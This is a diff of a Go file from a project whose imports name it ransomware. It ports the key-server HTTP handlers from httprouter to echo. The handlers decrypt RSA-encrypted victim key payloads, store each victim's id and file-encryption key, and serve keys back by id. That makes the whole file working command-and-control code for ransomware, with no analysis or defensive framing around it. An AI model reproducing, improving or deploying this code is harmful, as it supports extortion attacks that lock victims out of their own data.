@@ -6,40 +6,35 @@ import (
 	"fmt"
 	"net/http"
 
-	"github.com/julienschmidt/httprouter"
+	"github.com/labstack/echo"
 	"github.com/mauri870/ransomware/repository"
 	"github.com/mauri870/ransomware/rsa"
 )
 
-func addKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
-	r.ParseForm()
-
+func addKeys(c echo.Context) error {
 	// Check if payload parameter exists
-	if _, ok := r.Form["payload"]; !ok {
-		http.Error(w, ApiResponseNoPayload, http.StatusUnprocessableEntity)
-		return
+	payloadValue := c.FormValue("payload")
+	if payloadValue == "" {
+		return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
 	}
 
 	// Decode the base64 string to []byte
-	payload, err := base64.StdEncoding.DecodeString(r.FormValue("payload"))
+	payload, err := base64.StdEncoding.DecodeString(payloadValue)
 	if err != nil {
-		http.Error(w, ApiResponseBadRequest, http.StatusBadRequest)
-		return
+		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
 	}
 
 	// Decrypt the payload
 	jsonPayload, err := rsa.Decrypt(PRIV_KEY, payload)
 	if err != nil {
-		http.Error(w, ApiResponseBadRSAEncryption, http.StatusUnprocessableEntity)
-		return
+		return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
 	}
 
 	// Parse the json keys
 	keys, err := parseJsonKeys(jsonPayload)
 	if err != nil {
 		// Bad Json
-		http.Error(w, ApiResponseBadJson, http.StatusBadRequest)
-		return
+		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
 	}
 
 	// If nothing goes wrong, persist the keys...
@@ -48,21 +43,19 @@ func addKeys(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
 
 	if !db.IsAvailable(keys["id"]) {
 		// Id already exists
-		http.Error(w, ApiResponseDuplicatedId, http.StatusConflict)
-		return
+		return c.JSON(http.StatusConflict, ApiResponseDuplicatedId)
 	}
 
 	db.CreateOrUpdate(keys["id"], keys["enckey"])
 
 	// Success \o/
-	w.WriteHeader(http.StatusNoContent)
+	return c.NoContent(http.StatusNoContent)
 }
 
-func getEncryptionKey(w http.ResponseWriter, r *http.Request, ps httprouter.Params) {
-	id := ps.ByName("id")
+func getEncryptionKey(c echo.Context) error {
+	id := c.Param("id")
 	if len(id) != 32 {
-		http.Error(w, ApiResponseBadRequest, 400)
-		return
+		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
 	}
 
 	// If nothing goes wrong, try get the encryption key...
@@ -71,16 +64,10 @@ func getEncryptionKey(w http.ResponseWriter, r *http.Request, ps httprouter.Para
 
 	enckey, err := db.Find(id)
 	if err != nil {
-		http.Error(w, ApiResponseResourceNotFound, 418)
-		return
+		return c.JSON(http.StatusTeapot, ApiResponseResourceNotFound)
 	}
 
-	fmt.Fprintf(w, `{"status": 200, "enckey": "%s"}`, enckey)
-}
-
-func notFound(w http.ResponseWriter, r *http.Request) {
-	http.Error(w, ApiResponseNotFound, http.StatusNotFound)
-	return
+	return c.JSON(http.StatusOK, fmt.Sprintf(`{"status": 200, "enckey": "%s"}`, enckey))
 }
 
 // Parse the json keys
